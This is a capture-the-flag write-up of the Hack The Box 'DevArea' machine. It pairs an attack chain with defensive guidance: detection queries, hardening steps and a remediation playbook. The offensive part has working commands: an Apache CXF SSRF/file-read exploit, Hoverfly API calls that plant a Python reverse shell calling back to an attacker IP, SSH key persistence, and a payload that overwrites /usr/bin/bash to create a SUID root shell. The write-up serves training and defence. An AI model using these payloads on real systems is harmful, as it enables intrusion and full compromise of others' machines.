# DevArea

```
Difficulty: Medium
Operating System: Linux
Services: FTP, SSH, HTTP, HTTP-Proxy (Jetty), Hoverfly API

```


## Summary of Attack Chain

| Step | User / Access   | Technique Used                              | Result                                                                                                                       |
| :--: | :-------------- | :------------------------------------------ | :--------------------------------------------------------------------------------------------------------------------------- |
|   1  | N/A (External)  | **Network Enumeration (Nmap)**              | Discovered open ports `21` (FTP), `22` (SSH), `8080` (SOAP), and `8888` (Hoverfly Admin API).                                |
|   2  | Unauthenticated | **SSRF / Local File Read (CVE-2022-46364)** | Exploited XOP include vulnerability in Apache CXF on `8080/employeeservice`.                                                 |
|   3  | Unauthenticated | **Credential Harvesting**                   | Retrieved `/etc/systemd/system/hoverfly.service` and extracted Hoverfly admin credentials.                                   |
|   4  | Admin (API)     | **API Authentication**                      | Logged into the Hoverfly Admin API on port `8888` and obtained a JWT token.                                                  |
|   5  | Admin (API)     | **Middleware Injection**                    | Uploaded a malicious Python reverse shell as middleware and switched the proxy to `synthesize` mode.                         |
|   6  | Unauthenticated | **SSRF to Internal Proxy**                  | Triggered the vulnerable endpoint to interact with `127.0.0.1:8500`, executing the malicious middleware.                     |
|   7  | dev_ryan        | **Initial Access / Reverse Shell**          | Received shell access as `dev_ryan` and retrieved **user.txt**.                                                              |
|   8  | dev_ryan        | **SSH Persistence**                         | Added a public key to `authorized_keys` to maintain access.                                                                  |
|   9  | dev_ryan        | **Privilege Enumeration (sudo)**            | Identified `NOPASSWD` privileges for `/opt/syswatch/syswatch.sh`.                                                            |
|  10  | Root            | **System Binary Overwrite**                 | Used `dd` to overwrite `/usr/bin/bash` with a malicious script.                                                              |
|  11  | Root            | **Privilege Escalation**                    | Executed `sudo /opt/syswatch/syswatch.sh -version`, triggering the compromised bash interpreter and retrieving **root.txt**. |


![DevArea](htb_dev_area_MIndmap.png)

# Offensive Operations

### **Reconnaissance & Enumeration**

Every good chain starts with thorough enumeration. The initial Nmap scan highlighted a few non-standard ports that immediately draw attention:
* **Port 8080 (http-proxy):** Running Jetty 9.4.27. Directory fuzzing or manual inspection reveals the `/employeeservice?wsdl` endpoint, indicating a SOAP web service.
* **Port 8500 (fmtp) & 8888 (sun-answerbook):** These are the default ports for **Hoverfly**, an API simulation and proxy tool. Port 8500 is typically the proxy itself, and 8888 is the Admin API.

[Network_Map](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/DevArea/nmap_results.nmap "Results")

### **The Apache CXF SSRF (CVE-2022-46364)**

The SOAP service on port 8080 uses Apache CXF, which is vulnerable to a Server-Side Request Forgery (SSRF) and Local File Inclusion (LFI) flaw via XOP (XML-binary Optimized Packaging) inclusion. 

![DevArea](htb_dev_area_web.png)
![DevArea](htb_dev_area_jetty.png)
![DevArea](htb_dev_area_jetty_apa.png)

**The Vulnerability:**
By injecting an `<xop:Include>` tag into a standard SOAP request, you can force the underlying XML parser to fetch an external or local resource. The server reads the file and embeds its contents as a Base64 encoded string inside the XML response. 

Using the `lfi.sh` wrapper script, we exploit this to read local files on the target.

```bash
./lfi.sh file:///etc/systemd/system/hoverfly.service
```
[lfi.sh](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/DevArea/lfi.sh "Results")


![DevArea](htb_dev_area_lfi_cred.png)


**The Finding:**
By reading the systemd service file for Hoverfly, we uncover how the service is started. The `ExecStart` line contains hardcoded administrative credentials passed as arguments:
`ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IXXXXXXXXX -listen-on-host 0.0.0.0`


![DevArea](htb_dev_area_lfi_application.png)


### **Weaponizing Hoverfly for RCE**

With admin credentials in hand, the focus shifts to the Hoverfly Admin API on port 8888. Hoverfly supports "middleware"—scripts (often Python or executable binaries) that can intercept, modify, or generate API traffic. We can abuse this feature to gain RCE.

#### **Authentication**
First, we authenticate against the API to get a JWT session token.
```bash
curl -s -X POST http://10.129.128.3:8888/api/token-auth \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"O7IXXXXXXXXX"}'
```
*(This returns the long JWT token required for the next API calls).*

![DevArea](htb_dev_area_lfi_token.png)

#### **Injecting Malicious Middleware**
Next, we upload a middleware script. We configure Hoverfly to use `python3` as the binary and pass it a standard Python reverse shell as the script. This tells the server: *whenever this middleware is triggered, execute this Python code*.

```bash
curl -X PUT http://10.129.128.3:8888/api/v2/hoverfly/middleware \
  -H "Authorization: Bearer <YOUR_JWT_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"binary":"python3", "script":"import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.XX.XX\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")"}'
```

#### **Setting the Trap**
For the middleware to execute, Hoverfly needs to process a request. By default, Hoverfly might just pass traffic through. We need to force it into `synthesize` mode. In this mode, Hoverfly ignores the actual destination of the request and *only* uses the middleware to generate a response. 

```bash
curl -X PUT http://10.129.128.3:8888/api/v2/hoverfly/mode \
  -H "Authorization: Bearer <YOUR_JWT_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"mode":"synthesize"}'
```

#### **Triggering the Exploit**
The middleware is armed, but port 8500 (the proxy) is likely bound to `localhost` or restricted from external access, meaning we can't just curl it from our Kali machine directly. 

This is where we chain the vulnerabilities. We use the **initial Apache CXF SSRF flaw** to make the target server send a request to its own internal proxy. 

Pop open a new tmux pane for your listener:
```bash
nc -lnvp 4444
```

Then, trigger the SSRF:
```bash
./lfi.sh http://admin:O7IXXXXXXXXX@127.0.0.1:8500/
```

### **Initial Foothold**

The SOAP service attempts to fetch the URL via the proxy on port 8500. Hoverfly intercepts the request, enters `synthesize` mode, and executes our Python middleware. The script fires, throwing a reverse shell back to `10.10.XX.XX:4444`.

You catch the shell as the `dev_ryan` user. 

```bash
dev_ryan@devarea:/opt$ cd /home/dev_ryan
dev_ryan@devarea:~$ cat user.txt
```


![DevArea](htb_dev_area_user_flag.png)


### **Privilege Escalation Enumeration**

As with any Linux box, the first step after landing a shell is checking for low-hanging fruit. 

**The Command:**
```bash
dev_ryan@devarea:~$ sudo -l
```

![DevArea](htb_dev_area_l.png)


**The Finding:**
The output shows that `dev_ryan` can run a specific script as root without a password:
`(root) NOPASSWD: /opt/syswatch/syswatch.sh`

While you can't edit `syswatch.sh` itself to inject malicious code, you know that the script relies on an interpreter. If it starts with `#!/bin/bash` (which it does), `sudo` will call `/usr/bin/bash` to execute it. If you can control `/usr/bin/bash`, you control what executes as root.

![DevArea](htb_dev_area_env.png)

### **Bypassing the Kernel Lock**

The goal is to overwrite `/usr/bin/bash` with a malicious script. However, Linux protects running executables. Because your initial reverse shell was spawned using `pty.spawn("/bin/bash")`, the kernel places a lock on the binary, resulting in the `Text file busy` error when you try to overwrite it.

To bypass this, you need a shell session that doesn't rely on `bash`. 

**The SSH Persistence Strategy:**
1. Generate an SSH keypair on your local Kali machine.
2. Drop the public key into `/home/dev_ryan/.ssh/authorized_keys`.
3. SSH into the box, explicitly requesting a different shell like `/bin/sh` (which is often symlinked to `dash` on Debian/Ubuntu systems).

```bash
# On Kali:
ssh -i /tmp/ctf_key dev_ryan@10.129.128.3 /bin/sh
```
Now, `/usr/bin/bash` is completely free of locks and ready to be overwritten.

![DevArea](htb_dev_area_ssh_dev.png)

### **The Overwrite Exploit**

With the lock removed, you prepare the trap. Instead of a complex binary exploit, you simply replace the `bash` executable with a shell script.

**Create a Backup:**
Always back up system binaries before tampering with them so you don't permanently break the box.
```sh
cp /usr/bin/bash /tmp/bash.bak
```

**Payload:**
You create a script (`/tmp/payload.sh`) that will act as the fake bash. When executed as root, this script will:
* Point its own hashbang to the backed-up bash (`#!/tmp/bash.bak`) so it can actually run.
* Copy the root flag to `/tmp` and make it readable by everyone.
* Create a SUID copy of the real bash (`/tmp/rootbash`) to give you a persistent, interactive root shell.
* Attempt to restore the original bash binary.
* Pass execution back to the real bash so `syswatch.sh` finishes running without looking suspicious.

```sh
cat << 'EOF' > /tmp/payload.sh
#!/tmp/bash.bak
cat /root/root.txt > /tmp/root.txt
chmod 777 /tmp/root.txt
cp /tmp/bash.bak /tmp/rootbash
chmod +s /tmp/rootbash
cp /tmp/bash.bak /usr/bin/bash
exec /tmp/bash.bak "$@"
EOF

chmod +x /tmp/payload.sh
```

![DevArea](htb_dev_area_payload.png)


### **Execution and Cleanup**

This is where the magic happens. 

**1. Spring the Trap:**
You use `dd` to forcefully overwrite the system's `bash` with your script. 
```sh
dd if=/tmp/payload.sh of=/usr/bin/bash
```

**2. Trigger the Sudo Command:**
You run the command you are allowed to execute. 
```sh
sudo /opt/syswatch/syswatch.sh -version
```
`sudo` sees the command, sees it requires `/usr/bin/bash`, and executes your payload as root. 

*(Note: The binary garbage and syntax errors you saw earlier happen here because the payload attempts to overwrite `/usr/bin/bash` while it is currently reading from it, causing the interpreter to choke on raw binary data. However, because bash executes line-by-line, the first half of the script—the part that steals the flag and makes the SUID shell—has already succeeded before the crash).*

**3. Claim the Flag:**
```sh
cat /tmp/root.txt
```

![DevArea](htb_dev_area_ssh_root_flag.png)

**4. Restore the System:**
To be a good citizen on the CTF platform and fix the syntax errors for anyone else relying on `bash`, you restore the backup:
```sh
cat /tmp/bash.bak > /usr/bin/bash
```

# Defenisve Operations

## Strategic Overview

* **1.1 Definition:** A multi-stage, cross-layer intrusion exploiting an application-layer Server-Side Request Forgery (SSRF) to weaponize an internal API simulation proxy, culminating in kernel-level code execution via system binary hijacking.
* **1.2 Impact:** Complete system compromise (Root authority), enabling unrestricted lateral movement, data exfiltration, and persistent stealth access via Secure Shell (SSH) and SUID backdoors.
* **1.3 The Scenario:** An external threat actor exploited CVE-2022-46364 in a public-facing Apache CXF SOAP service to exfiltrate internal systemd service configurations. Recovered cleartext credentials facilitated the hijacking of the internal Hoverfly proxy, leading to remote code execution. The actor subsequently bypassed file locks via an SSH session downgrade to overwrite `/usr/bin/bash`, exploiting a `sudo` misconfiguration to achieve root.



## System Architecture & Theory

* **2.1 Protocol Environment:** Linux OS (Debian/Ubuntu architecture), Apache CXF (Port 8080), Hoverfly API Proxy (Ports 8500, 8888), OpenSSH (Port 22), Sudo runtime environment.
* **2.2 Attack Logic Flow:**
> [External SOAP API] -> [SSRF / LFI] -> [Local Credential Exposure] -> [Internal Hoverfly Proxy Weaponization] -> [Reverse Shell (dev_ryan)] -> [SSH Persistence] -> [Sudo Execution / Binary Overwrite] -> [Root Compromise]

* **2.3 Theoretical Analogy:** An adversary uses a teller's intercom (SSRF) to read the vault manager's passcode from a distant sticky note (LFI). They use that passcode to reprogram the bank's internal pneumatic tube system (Hoverfly) to deliver a weapon (Reverse Shell). Finally, they replace the security guard's weapon with a replica (Bash Overwrite) that fires backward when the manager orders them to shoot (Sudo Execution).



## Attack Vector (Mechanics)

### Core Mechanism

| Attribute                  | Technical Details                                                                                                                                                                                                                                                                                                             |
| :------------------------- | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Primary Identifiers**    | `employeeservice?wsdl`, `/etc/systemd/system/hoverfly.service`, Hoverfly API `/api/v2/hoverfly/middleware`, `/opt/syswatch/syswatch.sh`                                                                                                                                                                                       |
| **Critical Vulnerability** | Unsanitized XML entity parsing (**CVE-2022-46364**) in **Apache CXF**, plaintext credentials stored in a systemd service file, and overly permissive `sudo` rights on a script dependent on the **Bash** interpreter.                                                                                                         |
| **Offensive Action**       | Crafted malicious XOP payloads to force the server to disclose local files. Retrieved credentials from a service configuration file, used them to access the **Hoverfly** admin API, injected malicious middleware with a Python reverse shell, and finally hijacked a privileged script by replacing the system bash binary. |


### Prerequisites

* **Access Level:** Unauthenticated network access to the web interface.
* **Connectivity:** TCP/8080 (HTTP-Proxy), TCP/22 (SSH).
* **Target State:** Apache CXF < 3.5.5, Hoverfly service running with hardcoded initialization credentials, Sudo configuration allowing `syswatch.sh` execution without a password prompt.



## Threat Hunting & Anomaly Analysis

* **Hunt Hypothesis:** Adversaries exploiting SOAP SSRF will generate anomalous internal HTTP requests originating from the web application user context, followed by unexpected Python processes spawning network connections, and concluding with anomalous write operations to core system binaries (`/usr/bin/bash`).
* **Behavioral Outliers:** The Apache CXF service account initiating loopback HTTP connections to `127.0.0.1:8888`. A Python process spawning a pseudo-terminal (`pty.spawn`) or executing `/bin/bash` directly. The `dd` or `cp` utility modifying immutable system paths like `/usr/bin/bash`.
* **Toxic Combinations:** The combination of a highly permissive internal proxy (Hoverfly) accepting unauthenticated or weakly authenticated middleware changes, paired with an edge-facing web application capable of SSRF, creates an unauthenticated RCE bridge.



## Detection Engineering 

* **Telemetry Gap Analysis:** Requires Web Access Logs (HTTP POST requests with `application/xop+xml`), Sysmon for Linux Event ID 1 (Process Creation) for python/reverse shells, Sysmon Event ID 3 (Network Connection) for loopback anomalies, Sysmon Event ID 11 (File Create/Overwrite) for `/usr/bin/bash` modifications, and `auth.log` / `secure` for `sudo` execution tracing.
* **Detection-as-Code (KQL):**
```kql
// Detect anomalous modification of the Bash interpreter
DeviceFileEvents
| where ActionType in ("FileModified", "FileCreated", "FileRenamed")
| where FolderPath == "/usr/bin/bash" or FolderPath == "/bin/bash"
| where InitiatingProcessFileName in ("dd", "cp", "mv", "cat", "echo")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessCommandLine, FolderPath, SHA256
```

* **Resilience Test:** An adversary may attempt to bypass binary modification detection by altering the `$PATH` variable to prioritize a malicious bash script in `/tmp` before `/usr/bin/bash`. **Sub-Rule:** Monitor for `sudo` executions where the environment variables explicitly modify `$PATH` or where `secure_path` is disabled in `/etc/sudoers`.



## Toolkit & Implementation

* **Automation:** Native `curl` (for API manipulation and SSRF triggering), `ssh-keygen` (for persistence and lock bypass), native `dd` (for kernel-lock evasion and binary overwrite).
* **OPSEC Analysis:** The adversary utilized local loopback (`127.0.0.1`) for the SSRF, keeping the exploitation traffic internal and bypassing edge IDS/IPS. The use of SSH downgraded to `/bin/sh` to bypass the `Text file busy` lock demonstrates advanced system mechanics knowledge, avoiding process crashing that would alert system administrators. Restoring `/usr/bin/bash` via `cat /tmp/bash.bak > /usr/bin/bash` is a sophisticated anti-forensic measure to maintain system stability and hide the privilege escalation vector.
* **Post-Exploitation:** SSH key injection into `/home/dev_ryan/.ssh/authorized_keys` for persistent, credential-less access. Generation of a SUID root binary (`/tmp/rootbash`) for discrete on-demand privilege escalation without relying on the original `sudo` flaw.



## Defensive Mitigation

* **Technical Hardening:**
    1. Patch Apache CXF to a version >= 3.5.5 to mitigate CVE-2022-46364.
    2. Remove hardcoded credentials from `/etc/systemd/system/hoverfly.service`. Utilize environment variables or secure secret managers.
    3. Bind the Hoverfly Admin API exclusively to `localhost` and implement robust authentication (e.g., mTLS).
    4. Implement `chattr +i /usr/bin/bash` to make core system binaries immutable, preventing modification even by root unless the attribute is manually removed.
    5. Reconfigure Sudoers to restrict `syswatch.sh`. Ensure the directory and script are owned by root and strictly immutable.
* **Personnel Focus:** Mandate secure coding practices specifically regarding XML parsing (explicitly disabling external entities). Implement mandatory peer review for systemd unit files to prevent credential leakage.



## Quick-Action Playbook

|  Step  | Objective                           | Technical Command / Logic                                |
| :----: | :---------------------------------- | :------------------------------------------------------- |
| **01** | **Enumerate SUID Binaries**         | `find / -perm -4000 -type f 2>/dev/null`                 |
| **02** | **Investigate Suspicious Activity** | `grep -i "sudo" /var/log/auth.log \| grep "syswatch.sh"` |
| **03** | **Remediate Compromised Binary**    | `apt-get --reinstall install bash`                       |
